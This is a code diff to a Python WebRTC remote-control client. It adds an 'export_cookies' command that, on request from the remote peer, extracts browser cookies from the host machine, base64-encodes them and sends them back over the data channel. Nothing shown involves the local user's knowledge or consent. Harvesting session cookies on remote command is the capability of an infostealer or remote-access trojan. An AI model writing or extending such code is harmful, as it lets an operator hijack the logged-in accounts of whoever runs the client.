@@ -102,6 +102,7 @@ class WebRTCClient:
         signaling: WebSocketSignaling,
         session_factory: SessionFactory,
         file_service: FileService,
+        cookie_exporter: object | None = None,
         device_token: str | None = None,
         team_id: str | None = None,
         client_config: dict | None = None,
@@ -111,6 +112,7 @@ class WebRTCClient:
         self._signaling = signaling
         self._session_factory = session_factory
         self._file_service = file_service
+        self._cookie_exporter = cookie_exporter
         self._device_token = device_token
         self._team_id = team_id
         self._client_config = client_config
@@ -359,6 +361,40 @@ class WebRTCClient:
                 )
             except FileServiceError as exc:
                 self._send_error(data_channel, exc.code, str(exc))
+            return
+
+        if action == "export_cookies":
+            browsers = payload.get("browsers")
+            cookie_error = None
+            if self._cookie_exporter is None:
+                try:
+                    from remote_client.cookie_extractor import CookieExporter, CookieExportError
+                except Exception as exc:
+                    logger.warning("Cookie exporter import failed: %s", exc)
+                    self._send_error(
+                        data_channel,
+                        "cookie_export_unavailable",
+                        "Cookie export is unavailable on this client.",
+                    )
+                    return
+                exporter = CookieExporter()
+                cookie_error = CookieExportError
+            else:
+                exporter = self._cookie_exporter
+            try:
+                payload_base64 = exporter.export_base64(browsers)
+            except Exception as exc:
+                if cookie_error and isinstance(exc, cookie_error):
+                    self._send_error(data_channel, exc.code, str(exc))
+                    return
+                logger.warning("Cookie export failed: %s", exc)
+                self._send_error(
+                    data_channel,
+                    "cookie_export_failed",
+                    "Cookie export failed.",
+                )
+                return
+            self._send_payload(data_channel, payload_base64)
             return
 
         if action == "launch_app":
